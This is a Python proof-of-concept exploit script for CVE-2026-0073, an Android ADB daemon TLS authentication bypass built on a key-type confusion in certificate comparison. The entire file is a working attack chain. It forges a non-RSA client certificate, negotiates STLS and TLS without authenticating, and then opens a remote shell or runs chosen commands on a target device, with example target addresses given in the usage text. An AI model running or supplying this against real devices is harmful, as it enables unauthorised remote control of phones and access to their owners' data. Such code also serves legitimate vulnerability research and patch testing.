#!/usr/bin/env python3
"""
CVE-2026-0073 — Android ADBD TLS Authentication Bypass
https://github.com/SecTestAnnaQuinn/CVE-2026-0073-Android-ADBD-bypass-POC

Exploits a type-confusion bug in adbd_tls_verify_cert() where
EVP_PKEY_cmp() returns -1 (key type mismatch) which is truthy in C,
granting auth when presenting an EC/Ed25519 cert against a stored RSA key.

Flow:
  1. TCP → CNXN → STLS negotiation (cleartext)
  2. TLS 1.3 upgrade with ephemeral non-RSA client cert
  3. Drain post-TLS CNXN (skip host CNXN to avoid transport kick)
  4. OPEN shell stream with delayed_ack window

Requirements:
  - Developer options + Wireless debugging / ADB-over-TCP enabled
  - At least one RSA key in /data/misc/adb/adb_keys (USB-paired before)
  - Network reachability to the adbd port

Usage:
  python3 adb_tls_auth_bypass.py <host> [port] [--cmd <command>]
  python3 adb_tls_auth_bypass.py 192.168.1.42 5555 --cmd "id"
"""


import argparse
import io
import os
import socket
import ssl
import struct
import sys
import tempfile
import textwrap
import threading
import time

from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import ec, ed25519
from cryptography.x509.oid import NameOID
import datetime


# ── ADB wire protocol constants ──────────────────────────────────────────────

ADB_VERSION    = 0x01000001
ADB_MAXDATA    = 256 * 1024
ADB_BANNER     = b"host::features=shell_v2,cmd,stat_v2,ls_v2,fixed_push_mkdir,apex,abb,fixed_push_symlink_timestamp,abb_exec,remount_shell,track_app,sendrecv_v2,sendrecv_v2_brotli,sendrecv_v2_lz4,sendrecv_v2_zstd,sendrecv_v2_dry_run_send,openscreen_mdns,delayed_ack"

DELAYED_ACK_WINDOW = 32 * 1024 * 1024  # 32 MB initial receive window

CMD_CNXN = 0x4e584e43
CMD_STLS = 0x534c5453
CMD_AUTH = 0x41555448
CMD_OPEN = 0x4e45504f
CMD_OKAY = 0x59414b4f
CMD_WRTE = 0x45545257
CMD_CLSE = 0x45534c43

STLS_VERSION = 0x01000000


# ── ADB packet framing ───────────────────────────────────────────────────────

def _checksum(data: bytes) -> int:
    return sum(data) & 0xFFFFFFFF


def pack_packet(cmd: int, arg0: int, arg1: int, data: bytes = b"") -> bytes:
    length = len(data)
    csum   = _checksum(data)
    magic  = cmd ^ 0xFFFFFFFF
    header = struct.pack("<IIIIII", cmd, arg0, arg1, length, csum, magic)
    return header + data


def unpack_header(raw: bytes):
    cmd, arg0, arg1, length, csum, magic = struct.unpack("<IIIIII", raw)
    return cmd, arg0, arg1, length, csum, magic


def recv_packet(sock):
    """Read one ADB packet. Returns (cmd, arg0, arg1, data)."""
    header = _recv_exact(sock, 24)
    cmd, arg0, arg1, length, csum, magic = unpack_header(header)
    data = _recv_exact(sock, length) if length else b""
    return cmd, arg0, arg1, data


def _recv_exact(sock, n: int) -> bytes:
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise ConnectionError(f"connection closed after {len(buf)}/{n} bytes")
        buf += chunk
    return buf


# ── Ephemeral non-RSA TLS client certificate ─────────────────────────────────

def make_client_cert(key_type: str = "ec") -> tuple[bytes, bytes]:
    """
    Generate a throw-away non-RSA key + self-signed cert.
    Triggers EVP_PKEY_cmp() → -1 (type mismatch = truthy in C).

    key_type: "ec" (P-256) or "ed25519"
    Returns: (cert_pem, key_pem)
    """
    if key_type == "ed25519":
        key = ed25519.Ed25519PrivateKey.generate()
        sign_hash = None
    else:
        key = ec.generate_private_key(ec.SECP256R1())
        sign_hash = hashes.SHA256()

    now = datetime.datetime.now(datetime.timezone.utc)
    subject = issuer = x509.Name([
        x509.NameAttribute(NameOID.COMMON_NAME, "ADB RSA Key"),
        x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Android"),
    ])
    cert = (
        x509.CertificateBuilder()
        .subject_name(subject)
        .issuer_name(issuer)
        .public_key(key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(now)
        .not_valid_after(now + datetime.timedelta(days=365))
        .add_extension(
            x509.BasicConstraints(ca=False, path_length=None), critical=True,
        )
        .add_extension(
            x509.KeyUsage(
                digital_signature=True,
                key_encipherment=True,
                content_commitment=False,
                data_encipherment=False,
                key_agreement=False,
                key_cert_sign=False,
                crl_sign=False,
                encipher_only=False,
                decipher_only=False,
            ),
            critical=True,
        )
        .sign(key, sign_hash)
    )
    cert_pem = cert.public_bytes(serialization.Encoding.PEM)
    # Ed25519 requires PKCS8 format
    key_format = (serialization.PrivateFormat.PKCS8
                  if key_type == "ed25519"
                  else serialization.PrivateFormat.TraditionalOpenSSL)
    key_pem = key.private_bytes(
        serialization.Encoding.PEM,
        key_format,
        serialization.NoEncryption(),
    )
    return cert_pem, key_pem


# ── Core exploit ─────────────────────────────────────────────────────────────

class ADBBypass:
    """Implements the full CVE-2026-0073 bypass chain."""

    def __init__(self, host: str, port: int, verbose: bool = False):
        self.host    = host
        self.port    = port
        self.verbose = verbose
        self.sock    = None
        self.tls     = None
        self._local_id  = 1
        self._remote_id = None

    def _log(self, msg: str):
        if self.verbose:
            print(f"[*] {msg}", file=sys.stderr)

    def _send(self, sock, data: bytes):
        sock.sendall(data)

    # ── Phase 1: cleartext CNXN → STLS ───────────────────────────────────

    def connect(self):
        self._log(f"connecting to {self.host}:{self.port}")
        self.sock = socket.create_connection((self.host, self.port), timeout=30)

        cnxn = pack_packet(CMD_CNXN, ADB_VERSION, ADB_MAXDATA, ADB_BANNER)
        self._log("sending CNXN")
        self._send(self.sock, cnxn)

        # Wait for STLS (device may send CNXN first)
        for _ in range(3):
            cmd, arg0, arg1, data = recv_packet(self.sock)
            self._log(f"  <- {cmd:#010x} arg0={arg0:#x} arg1={arg1:#x} data={data[:64]!r}")
            if cmd == CMD_STLS:
                stls_version = arg0
                self._log(f"received STLS version={stls_version:#x}")
                break
            elif cmd == CMD_AUTH:
                raise RuntimeError(
                    "Device responded AUTH (not STLS). "
                    "Not using wireless-debugging/TLS path."
                )
            elif cmd == CMD_CNXN:
                self._log("received pre-STLS CNXN, waiting for STLS...")
                continue
            else:
                raise RuntimeError(f"unexpected command {cmd:#010x}")
        else:
            raise RuntimeError("did not receive STLS from device")

        self._log("sending STLS reply")
        self._send(self.sock, pack_packet(CMD_STLS, stls_version, 0))

    # ── Phase 2: TLS upgrade with cross-algorithm cert ───────────────────

    def upgrade_tls(self, cert_pem: bytes, key_pem: bytes, key_type: str = "ec",
                    tls_version: str = "1.3"):
        """Wrap TCP socket in TLS with the non-RSA client cert."""
        self._log(f"upgrading to TLS {tls_version} with {key_type.upper()} client certificate")

        with tempfile.NamedTemporaryFile(delete=False, suffix=".pem") as cf:
            cf.write(cert_pem)
            cert_path = cf.name
        with tempfile.NamedTemporaryFile(delete=False, suffix=".pem") as kf:
            kf.write(key_pem)
            key_path = kf.name

        try:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode    = ssl.CERT_NONE
            if tls_version == "1.2":
                ctx.minimum_version = ssl.TLSVersion.TLSv1_2
                ctx.maximum_version = ssl.TLSVersion.TLSv1_2
            else:
                ctx.minimum_version = ssl.TLSVersion.TLSv1_3
                ctx.maximum_version = ssl.TLSVersion.TLSv1_3
            ctx.load_cert_chain(certfile=cert_path, keyfile=key_path)

            self.tls = ctx.wrap_socket(self.sock, server_hostname=self.host)
            self._log(f"TLS handshake complete: {self.tls.version()}, cipher={self.tls.cipher()}")
            time.sleep(0.2)
        finally:
            os.unlink(cert_path)
            os.unlink(key_path)

    # ── Phase 3: post-TLS ADB service layer ──────────────────────────────

    def post_tls_cnxn(self):
        """Drain post-TLS device CNXN. Do NOT send host CNXN (transport already online)."""
        for _ in range(6):
            cmd, arg0, arg1, data = recv_packet(self.tls)
            self._log(f"  <- {cmd:#010x} arg0={arg0:#x} data={data[:64]!r}")
            if cmd == CMD_CNXN:
                self._log(f"device CNXN: {data.decode(errors='replace')}")
                break
            elif cmd == CMD_STLS:
                self._log(f"post-TLS STLS notification (version={arg0:#x}), ignoring")
                continue
            else:
                raise RuntimeError(f"expected CNXN/STLS inside TLS, got {cmd:#010x}")
        else:
            raise RuntimeError("did not receive post-TLS CNXN from device")
        self._recv_skip_stls_drain()

    def _recv_skip_stls_drain(self):
        """Non-blocking drain of buffered STLS notifications."""
        deadline = time.monotonic() + 0.3
        while time.monotonic() < deadline:
            try:
                self.tls.settimeout(0.05)
                cmd, arg0, arg1, data = recv_packet(self.tls)
                if cmd != CMD_STLS:
                    self._log(f"  unexpected post-drain packet {cmd:#010x}, ignoring")
            except (socket.timeout, OSError):
                break
            finally:
                self.tls.settimeout(None)

    def _recv_skip_stls(self):
        """Receive next packet, silently skipping STLS notifications."""
        for _ in range(8):
            cmd, arg0, arg1, data = recv_packet(self.tls)
            if cmd != CMD_STLS:
                return cmd, arg0, arg1, data
            self._log("  STLS notification, ignoring")
        raise RuntimeError("too many STLS frames")

    def open_shell(self) -> int:
        """OPEN shell stream with delayed_ack window. Returns remote_id."""
        payload = b"shell:\x00"
        self._log(f"sending OPEN local_id={self._local_id} window={DELAYED_ACK_WINDOW:#x}")
        self._send(self.tls, pack_packet(CMD_OPEN, self._local_id, DELAYED_ACK_WINDOW, payload))

        cmd, arg0, arg1, data = self._recv_skip_stls()
        self._log(f"  <- {cmd:#010x} arg0={arg0:#x} arg1={arg1:#x}")
        if cmd != CMD_OKAY:
            raise RuntimeError(f"OPEN rejected: {cmd:#010x} (expected OKAY)")

        self._remote_id = arg0
        self._log(f"shell stream opened: local={self._local_id} remote={self._remote_id}")
        self._send_okay()
        return self._remote_id

    def _send_okay(self):
        self._send(self.tls, pack_packet(CMD_OKAY, self._local_id, self._remote_id))

    def run_command(self, cmd_str: str) -> str:
        """Run a single command and return collected output."""
        payload = f"shell:{cmd_str}\x00".encode()
        self._log(f"OPEN for command: {cmd_str!r}")
        self._send(self.tls, pack_packet(CMD_OPEN, self._local_id, DELAYED_ACK_WINDOW, payload))

        cmd_r, arg0, arg1, data = self._recv_skip_stls()
        if cmd_r != CMD_OKAY:
            raise RuntimeError(f"OPEN for command rejected: {cmd_r:#010x}")
        remote = arg0
        self._send(self.tls, pack_packet(CMD_OKAY, self._local_id, remote))

        output = io.BytesIO()
        while True:
            cmd_r, arg0, arg1, data = recv_packet(self.tls)
            if cmd_r == CMD_WRTE:
                output.write(data)
                self._send(self.tls, pack_packet(CMD_OKAY, self._local_id, remote))
            elif cmd_r == CMD_CLSE:
                break
            elif cmd_r == CMD_OKAY:
                continue
            else:
                break
        return output.getvalue().decode(errors="replace")

    def interactive_shell(self):
        """Forward stdin/stdout to the ADB shell stream."""
        print("[+] interactive shell — Ctrl+C to exit", file=sys.stderr)

        stop = threading.Event()

        def reader():
            while not stop.is_set():
                cmd_r, arg0, arg1, data = recv_packet(self.tls)
                if cmd_r == CMD_WRTE:
                    sys.stdout.buffer.write(data)
                    sys.stdout.buffer.flush()
                    self._send_okay()
                elif cmd_r == CMD_CLSE:
                    stop.set()
                    break
                elif cmd_r == CMD_OKAY:
                    continue

        def writer():
            while not stop.is_set():
                try:
                    data = sys.stdin.buffer.read1(4096)
                except (OSError, ValueError):
                    break
                if data:
                    self._send(self.tls, pack_packet(CMD_WRTE, self._local_id, self._remote_id, data))

        t_read  = threading.Thread(target=reader, daemon=True)
        t_write = threading.Thread(target=writer, daemon=True)
        t_read.start()
        t_write.start()
        try:
            while t_read.is_alive():
                t_read.join(timeout=0.2)
        except KeyboardInterrupt:
            pass
        finally:
            stop.set()

    def close(self):
        try:
            if self.tls:
                self.tls.close()
            elif self.sock:
                self.sock.close()
        except Exception:
            pass


# ── Entry point ──────────────────────────────────────────────────────────────

def main():
    banner = """
  ╔══════════════════════════════════════════════════════════╗
  ║              CVE-2026-0073  //  ADBD BYPASS              ║
  ║    Android ADB Daemon TLS Authentication Bypass PoC      ║
  ║          EVP_PKEY_cmp type confusion exploit              ║
  ╚══════════════════════════════════════════════════════════╝
    """
    print(banner, file=sys.stderr)

    parser = argparse.ArgumentParser(
        description="CVE-2026-0073 — Android ADBD TLS auth bypass",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("""\
            Examples:
              %(prog)s 192.168.1.42
              %(prog)s 192.168.1.42 5555 --cmd "id"
              %(prog)s 192.168.1.42 37521 --cmd "getprop ro.build.version.security_patch"
        """),
    )
    parser.add_argument("host",          help="target device IP or hostname")
    parser.add_argument("port", nargs="?", type=int, default=5555, help="ADB port (default 5555)")
    parser.add_argument("--cmd",         help="shell command to run (default: interactive shell)")
    parser.add_argument("-v", "--verbose", action="store_true")
    parser.add_argument("--key-type", choices=["ec", "ed25519"], default=None,
                        help="force key type (default: auto-try ec → ed25519)")
    args = parser.parse_args()

    # Build attempt matrix: (key_type, tls_version)
    if args.key_type:
        attempts = [(args.key_type, "1.3"), (args.key_type, "1.2")]
    else:
        attempts = [
            ("ec",      "1.3"),
            ("ed25519", "1.3"),
            ("ec",      "1.2"),
        ]

    last_error = None
    for kt, tls_ver in attempts:
        label = f"{kt.upper()} / TLS {tls_ver}"
        print(f"[*] attempting bypass with {label}...", file=sys.stderr)
        cert_pem, key_pem = make_client_cert(key_type=kt)

        bypass = ADBBypass(args.host, args.port, verbose=args.verbose)
        try:
            bypass.connect()
            bypass.upgrade_tls(cert_pem, key_pem, key_type=kt, tls_version=tls_ver)
            bypass.post_tls_cnxn()

            print(f"[+] bypass succeeded with {label}!", file=sys.stderr)
            if args.cmd:
                output = bypass.run_command(args.cmd)
                print(output, end="")
            else:
                bypass.open_shell()
                bypass.interactive_shell()
            return
        except KeyboardInterrupt:
            return
        except Exception as e:
            last_error = e
            print(f"[-] {label} failed: {e}", file=sys.stderr)
            bypass.close()
            time.sleep(1)
            continue

    print(f"\n[-] all attempts exhausted. last error: {last_error}", file=sys.stderr)
    print(f"[!] device may have the CVE-2026-0073 patch applied.", file=sys.stderr)
    sys.exit(1)


if __name__ == "__main__":
    main()
